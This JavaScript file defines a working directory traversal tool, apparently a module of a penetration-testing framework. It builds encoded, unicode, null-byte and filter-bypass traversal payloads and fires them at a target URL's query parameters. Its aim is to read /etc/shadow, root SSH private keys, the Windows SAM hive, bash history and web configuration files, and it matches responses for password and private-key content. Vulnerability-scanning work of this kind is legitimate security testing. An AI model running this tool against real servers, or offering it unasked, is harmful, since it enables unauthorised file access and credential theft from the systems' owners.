const axios = require('axios');
const path = require('path');

class DirectoryTraversalExploit {
    constructor() {
        this.displayName = 'Directory Traversal Scanner';
        this.description = 'Path traversal and directory traversal vulnerability detection';
        this.severity = 'high';
        this.category = 'web-application';
        this.version = '2.0.0';

        // Directory traversal payloads
        this.payloads = {
            // Basic directory traversal
            basic: [
                '../',
                '..\\',
                '../../',
                '..\\..\\',
                '../../../',
                '..\\..\\..\\',
                '../../../../',
                '..\\..\\..\\..\\',
                '../../../../../',
                '..\\..\\..\\..\\..\\',
                '../../../../../../',
                '..\\..\\..\\..\\..\\..\\',
                '../../../../../../../',
                '..\\..\\..\\..\\..\\..\\..\\',
                '../../../../../../../../',
                '..\\..\\..\\..\\..\\..\\..\\..\\'
            ],

            // URL encoded payloads
            urlEncoded: [
                '%2e%2e%2f',
                '%2e%2e%5c',
                '%2e%2e%2f%2e%2e%2f',
                '%2e%2e%5c%2e%2e%5c',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f',
                '%2e%2e%5c%2e%2e%5c%2e%2e%5c',
                '..%2f',
                '..%5c',
                '..%2f..%2f',
                '..%5c..%5c',
                '..%2f..%2f..%2f',
                '..%5c..%5c..%5c'
            ],

            // Double URL encoded
            doubleEncoded: [
                '%252e%252e%252f',
                '%252e%252e%255c',
                '%252e%252e%252f%252e%252e%252f',
                '%252e%252e%255c%252e%252e%255c'
            ],

            // Unicode encoded
            unicode: [
                '..%u2215',
                '..%u005c',
                '..%c0%af',
                '..%c1%9c',
                '%c0%ae%c0%ae%c0%af',
                '%c0%ae%c0%ae%c1%9c'
            ],

            // Null byte injection
            nullByte: [
                '../%00',
                '..\\%00',
                '../../%00',
                '..\\..\\%00',
                '../../../%00',
                '..\\..\\..\\%00'
            ],

            // Filter bypass techniques
            bypass: [
                '....///',
                '....\\\\\\',
                '....//',
                '....\\\\',
                '...//',
                '...\\\\',
                '././..//',
                '.\\.\\.\\..\\\\',
                './.././',
                '.\\.\\..\\',
                '....',
                '..../',
                '....\\'
            ]
        };

        // Common target files for different operating systems
        this.targetFiles = {
            unix: [
                '/etc/passwd',
                '/etc/shadow',
                '/etc/hosts',
                '/etc/group',
                '/etc/issue',
                '/etc/hostname',
                '/etc/ssh/sshd_config',
                '/proc/version',
                '/proc/self/environ',
                '/proc/self/cmdline',
                '/var/log/auth.log',
                '/var/log/apache2/access.log',
                '/var/log/apache2/error.log',
                '/home/user/.ssh/id_rsa',
                '/root/.ssh/id_rsa',
                '/root/.bash_history',
                '/home/user/.bash_history'
            ],

            windows: [
                'C:\\Windows\\System32\\drivers\\etc\\hosts',
                'C:\\Windows\\System32\\config\\SAM',
                'C:\\Windows\\System32\\config\\SYSTEM',
                'C:\\Windows\\System32\\config\\SOFTWARE',
                'C:\\Windows\\win.ini',
                'C:\\Windows\\system.ini',
                'C:\\boot.ini',
                'C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config',
                'C:\\inetpub\\wwwroot\\web.config',
                'C:\\Windows\\debug\\NetSetup.log',
                'C:\\Windows\\system32\\license.rtf',
                'C:\\Windows\\System32\\drivers\\etc\\networks'
            ],

            web: [
                '/var/www/html/index.php',
                '/var/www/html/config.php',
                '/var/www/html/.htaccess',
                '/usr/local/apache2/conf/httpd.conf',
                '/etc/apache2/apache2.conf',
                '/etc/nginx/nginx.conf',
                'web.config',
                '.htaccess',
                'config.php',
                'database.php',
                'wp-config.php',
                'configuration.php'
            ]
        };

        // File signatures for validation
        this.fileSignatures = {
            '/etc/passwd': [
                /root:.*:0:0:/,
                /bin:.*:1:1:/,
                /daemon:.*:2:2:/,
                /^[^:]+:[^:]*:\d+:\d+:/
            ],
            '/etc/shadow': [
                /root:\$.*:/,
                /^[^:]+:\$[^:]*:/
            ],
            '/etc/hosts': [
                /127\.0\.0\.1\s+localhost/,
                /localhost/,
                /^#/
            ],
            'C:\\Windows\\win.ini': [
                /\[fonts\]/i,
                /\[extensions\]/i,
                /\[mci extensions\]/i
            ],
            'C:\\boot.ini': [
                /\[boot loader\]/i,
                /\[operating systems\]/i,
                /multi\(0\)/i
            ]
        };
    }

    async execute(target, options = {}) {
        try {
            const startTime = Date.now();
            const results = {
                target,
                timestamp: new Date(),
                vulnerabilities: [],
                statistics: {
                    totalTests: 0,
                    successfulTraversals: 0,
                    filesAccessed: 0,
                    payloadTypes: 0
                },
                detailedResults: {}
            };

            console.log(`[DirTraversal] Starting directory traversal scan on: ${target}`);

            // Parse target and identify testable parameters
            const targetInfo = this.parseTarget(target);

            if (!targetInfo.parameters || targetInfo.parameters.length === 0) {
                throw new Error('No testable parameters found in target URL');
            }

            console.log(`[DirTraversal] Found ${targetInfo.parameters.length} testable parameters`);

            // Test each parameter with different traversal techniques
            for (const param of targetInfo.parameters) {
                console.log(`[DirTraversal] Testing parameter: ${param.name}`);

                // Test basic directory traversal
                const basicResults = await this.testBasicTraversal(targetInfo, param, options);
                results.detailedResults[`${param.name}_basic`] = basicResults;
                results.statistics.totalTests += basicResults.tests.length;
                results.vulnerabilities.push(...basicResults.vulnerabilities);

                // Test encoded payloads
                const encodedResults = await this.testEncodedTraversal(targetInfo, param, options);
                results.detailedResults[`${param.name}_encoded`] = encodedResults;
                results.statistics.totalTests += encodedResults.tests.length;
                results.vulnerabilities.push(...encodedResults.vulnerabilities);

                // Test filter bypass techniques
                const bypassResults = await this.testBypassTechniques(targetInfo, param, options);
                results.detailedResults[`${param.name}_bypass`] = bypassResults;
                results.statistics.totalTests += bypassResults.tests.length;
                results.vulnerabilities.push(...bypassResults.vulnerabilities);

                // Test null byte injection
                const nullByteResults = await this.testNullByteInjection(targetInfo, param, options);
                results.detailedResults[`${param.name}_nullbyte`] = nullByteResults;
                results.statistics.totalTests += nullByteResults.tests.length;
                results.vulnerabilities.push(...nullByteResults.vulnerabilities);
            }

            // Calculate statistics
            results.statistics.successfulTraversals = results.vulnerabilities.length;
            results.statistics.filesAccessed = this.countUniqueFiles(results.vulnerabilities);
            results.statistics.payloadTypes = Object.keys(this.payloads).length;
            results.executionTime = Date.now() - startTime;

            console.log(`[DirTraversal] Scan completed. Found ${results.vulnerabilities.length} vulnerabilities in ${results.executionTime}ms`);

            return results;

        } catch (error) {
            console.error('[DirTraversal] Scan failed:', error.message);
            throw error;
        }
    }

    parseTarget(target) {
        try {
            const url = new URL(target);
            const parameters = [];

            // Extract URL parameters
            for (const [name, value] of url.searchParams.entries()) {
                parameters.push({
                    name,
                    value,
                    type: 'url',
                    location: 'query'
                });
            }

            return {
                protocol: url.protocol,
                host: url.host,
                pathname: url.pathname,
                search: url.search,
                parameters,
                baseUrl: `${url.protocol}//${url.host}${url.pathname}`
            };
        } catch (error) {
            throw new Error(`Invalid target URL: ${error.message}`);
        }
    }

    async testBasicTraversal(targetInfo, param, options) {
        const results = {
            type: 'basic_traversal',
            parameter: param.name,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[DirTraversal] Testing basic traversal on parameter: ${param.name}`);

        // Test against all target files
        for (const osType of Object.keys(this.targetFiles)) {
            for (const targetFile of this.targetFiles[osType]) {
                for (const payload of this.payloads.basic) {
                    try {
                        const traversalPayload = payload + targetFile.replace(/^[\/\\]/, '');
                        const testUrl = this.buildTestUrl(targetInfo, param.name, traversalPayload);

                        const response = await this.makeRequest(testUrl, options);

                        const testResult = {
                            payload: traversalPayload,
                            targetFile,
                            osType,
                            url: testUrl,
                            statusCode: response.status,
                            responseLength: response.data ? response.data.length : 0,
                            accessible: this.validateFileAccess(response.data, targetFile),
                            timestamp: new Date()
                        };

                        results.tests.push(testResult);

                        if (testResult.accessible) {
                            const vulnerability = {
                                type: 'Directory Traversal',
                                subtype: 'Basic Path Traversal',
                                severity: 'high',
                                parameter: param.name,
                                payload: traversalPayload,
                                targetFile,
                                osType,
                                evidence: this.extractFileEvidence(response.data, targetFile),
                                impact: 'Unauthorized access to system files and sensitive information',
                                recommendation: 'Implement proper input validation and use secure file access methods',
                                cwe: 'CWE-22',
                                owasp: 'A01:2021 – Broken Access Control'
                            };
                            results.vulnerabilities.push(vulnerability);
                            console.log(`[DirTraversal] File access successful: ${targetFile} via ${payload}`);
                        }

                    } catch (error) {
                        results.tests.push({
                            payload: payload + targetFile,
                            targetFile,
                            osType,
                            error: error.message,
                            timestamp: new Date()
                        });
                    }

                    // Rate limiting
                    if (options.delay) {
                        await this.sleep(options.delay);
                    }
                }
            }
        }

        return results;
    }

    async testEncodedTraversal(targetInfo, param, options) {
        const results = {
            type: 'encoded_traversal',
            parameter: param.name,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[DirTraversal] Testing encoded traversal on parameter: ${param.name}`);

        const encodingTypes = ['urlEncoded', 'doubleEncoded', 'unicode'];

        for (const encodingType of encodingTypes) {
            for (const payload of this.payloads[encodingType]) {
                // Test against a subset of critical files
                const criticalFiles = [
                    '/etc/passwd',
                    'C:\\Windows\\win.ini',
                    '/var/www/html/config.php'
                ];

                for (const targetFile of criticalFiles) {
                    try {
                        const traversalPayload = payload + targetFile.replace(/^[\/\\]/, '');
                        const testUrl = this.buildTestUrl(targetInfo, param.name, traversalPayload);

                        const response = await this.makeRequest(testUrl, options);

                        const testResult = {
                            payload: traversalPayload,
                            targetFile,
                            encodingType,
                            url: testUrl,
                            statusCode: response.status,
                            responseLength: response.data ? response.data.length : 0,
                            accessible: this.validateFileAccess(response.data, targetFile),
                            timestamp: new Date()
                        };

                        results.tests.push(testResult);

                        if (testResult.accessible) {
                            const vulnerability = {
                                type: 'Directory Traversal',
                                subtype: `Encoded Path Traversal (${encodingType})`,
                                severity: 'high',
                                parameter: param.name,
                                payload: traversalPayload,
                                targetFile,
                                encodingType,
                                evidence: this.extractFileEvidence(response.data, targetFile),
                                impact: 'Filter bypass through encoding allows unauthorized file access',
                                recommendation: 'Implement comprehensive input validation that handles all encoding types',
                                cwe: 'CWE-22',
                                owasp: 'A01:2021 – Broken Access Control'
                            };
                            results.vulnerabilities.push(vulnerability);
                            console.log(`[DirTraversal] Encoded traversal successful: ${targetFile} via ${encodingType}`);
                        }

                    } catch (error) {
                        results.tests.push({
                            payload: payload + targetFile,
                            targetFile,
                            encodingType,
                            error: error.message,
                            timestamp: new Date()
                        });
                    }

                    // Rate limiting
                    if (options.delay) {
                        await this.sleep(options.delay);
                    }
                }
            }
        }

        return results;
    }

    async testBypassTechniques(targetInfo, param, options) {
        const results = {
            type: 'bypass_techniques',
            parameter: param.name,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[DirTraversal] Testing bypass techniques on parameter: ${param.name}`);

        for (const payload of this.payloads.bypass) {
            // Test against critical files
            const criticalFiles = ['/etc/passwd', 'C:\\Windows\\win.ini'];

            for (const targetFile of criticalFiles) {
                try {
                    const traversalPayload = payload + targetFile.replace(/^[\/\\]/, '');
                    const testUrl = this.buildTestUrl(targetInfo, param.name, traversalPayload);

                    const response = await this.makeRequest(testUrl, options);

                    const testResult = {
                        payload: traversalPayload,
                        targetFile,
                        url: testUrl,
                        statusCode: response.status,
                        responseLength: response.data ? response.data.length : 0,
                        accessible: this.validateFileAccess(response.data, targetFile),
                        timestamp: new Date()
                    };

                    results.tests.push(testResult);

                    if (testResult.accessible) {
                        const vulnerability = {
                            type: 'Directory Traversal',
                            subtype: 'Filter Bypass',
                            severity: 'high',
                            parameter: param.name,
                            payload: traversalPayload,
                            targetFile,
                            evidence: this.extractFileEvidence(response.data, targetFile),
                            impact: 'Security filter bypass allows unauthorized file access',
                            recommendation: 'Implement robust input validation that cannot be bypassed with malformed paths',
                            cwe: 'CWE-22',
                            owasp: 'A01:2021 – Broken Access Control'
                        };
                        results.vulnerabilities.push(vulnerability);
                        console.log(`[DirTraversal] Bypass successful: ${targetFile} via ${payload}`);
                    }

                } catch (error) {
                    results.tests.push({
                        payload: payload + targetFile,
                        targetFile,
                        error: error.message,
                        timestamp: new Date()
                    });
                }

                // Rate limiting
                if (options.delay) {
                    await this.sleep(options.delay);
                }
            }
        }

        return results;
    }

    async testNullByteInjection(targetInfo, param, options) {
        const results = {
            type: 'null_byte_injection',
            parameter: param.name,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[DirTraversal] Testing null byte injection on parameter: ${param.name}`);

        for (const payload of this.payloads.nullByte) {
            // Test against critical files
            const criticalFiles = ['/etc/passwd', 'C:\\Windows\\win.ini'];

            for (const targetFile of criticalFiles) {
                try {
                    const traversalPayload = payload + targetFile.replace(/^[\/\\]/, '') + '.txt';
                    const testUrl = this.buildTestUrl(targetInfo, param.name, traversalPayload);

                    const response = await this.makeRequest(testUrl, options);

                    const testResult = {
                        payload: traversalPayload,
                        targetFile,
                        url: testUrl,
                        statusCode: response.status,
                        responseLength: response.data ? response.data.length : 0,
                        accessible: this.validateFileAccess(response.data, targetFile),
                        timestamp: new Date()
                    };

                    results.tests.push(testResult);

                    if (testResult.accessible) {
                        const vulnerability = {
                            type: 'Directory Traversal',
                            subtype: 'Null Byte Injection',
                            severity: 'high',
                            parameter: param.name,
                            payload: traversalPayload,
                            targetFile,
                            evidence: this.extractFileEvidence(response.data, targetFile),
                            impact: 'Null byte injection bypasses file extension validation',
                            recommendation: 'Properly validate input and avoid null byte truncation vulnerabilities',
                            cwe: 'CWE-158',
                            owasp: 'A01:2021 – Broken Access Control'
                        };
                        results.vulnerabilities.push(vulnerability);
                        console.log(`[DirTraversal] Null byte injection successful: ${targetFile}`);
                    }

                } catch (error) {
                    results.tests.push({
                        payload: payload + targetFile + '.txt',
                        targetFile,
                        error: error.message,
                        timestamp: new Date()
                    });
                }

                // Rate limiting
                if (options.delay) {
                    await this.sleep(options.delay);
                }
            }
        }

        return results;
    }

    buildTestUrl(targetInfo, paramName, payload) {
        const url = new URL(targetInfo.baseUrl);

        // Set original parameters
        for (const param of targetInfo.parameters) {
            if (param.name === paramName) {
                url.searchParams.set(param.name, payload);
            } else {
                url.searchParams.set(param.name, param.value);
            }
        }

        return url.toString();
    }

    async makeRequest(url, options = {}) {
        const requestOptions = {
            method: 'GET',
            url,
            timeout: options.timeout || 30000,
            headers: {
                'User-Agent': options.userAgent || 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                ...options.headers
            },
            validateStatus: () => true // Accept all status codes
        };

        return await axios(requestOptions);
    }

    validateFileAccess(responseData, targetFile) {
        if (!responseData || typeof responseData !== 'string') {
            return false;
        }

        // Check if response contains file-specific signatures
        const signatures = this.fileSignatures[targetFile];
        if (signatures) {
            return signatures.some(signature => signature.test(responseData));
        }

        // Generic file content checks
        const genericFileIndicators = [
            // Unix system files
            /root:.*:0:0:/,
            /bin:.*:1:1:/,
            /127\.0\.0\.1\s+localhost/,

            // Windows system files
            /\[fonts\]/i,
            /\[boot loader\]/i,
            /multi\(0\)/i,

            // Configuration files
            /<?php/,
            /\$_SERVER/,
            /database.*host/i,
            /password.*=/i,

            // Log files
            /\d{4}-\d{2}-\d{2}.*\d{2}:\d{2}:\d{2}/,

            // SSH keys
            /-----BEGIN.*PRIVATE KEY-----/,
            /-----BEGIN RSA PRIVATE KEY-----/
        ];

        return genericFileIndicators.some(indicator => indicator.test(responseData));
    }

    extractFileEvidence(responseData, targetFile) {
        if (!responseData || typeof responseData !== 'string') {
            return 'No response data';
        }

        // Return first 200 characters as evidence
        let evidence = responseData.substring(0, 200);

        // Add file-specific evidence
        const signatures = this.fileSignatures[targetFile];
        if (signatures) {
            for (const signature of signatures) {
                const match = responseData.match(signature);
                if (match) {
                    evidence += ` | File signature found: ${match[0]}`;
                    break;
                }
            }
        }

        return evidence;
    }

    countUniqueFiles(vulnerabilities) {
        const files = new Set();
        vulnerabilities.forEach(vuln => {
            if (vuln.targetFile) {
                files.add(vuln.targetFile);
            }
        });
        return files.size;
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async getInfo() {
        return {
            name: this.displayName,
            description: this.description,
            version: this.version,
            severity: this.severity,
            category: this.category,
            techniques: [
                'Basic Directory Traversal',
                'URL Encoded Traversal',
                'Double URL Encoded Traversal',
                'Unicode Encoded Traversal',
                'Null Byte Injection',
                'Filter Bypass Techniques'
            ],
            targetFiles: {
                unix: this.targetFiles.unix.length,
                windows: this.targetFiles.windows.length,
                web: this.targetFiles.web.length
            },
            parameters: [
                {
                    name: 'delay',
                    description: 'Delay between requests in milliseconds',
                    type: 'number',
                    default: 100
                },
                {
                    name: 'timeout',
                    description: 'Request timeout in milliseconds',
                    type: 'number',
                    default: 30000
                },
                {
                    name: 'userAgent',
                    description: 'Custom User-Agent header',
                    type: 'string',
                    default: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                }
            ],
            payloadCount: Object.values(this.payloads).reduce((total, arr) => total + arr.length, 0),
            fileSignatures: Object.keys(this.fileSignatures).length
        };
    }
}

module.exports = DirectoryTraversalExploit;
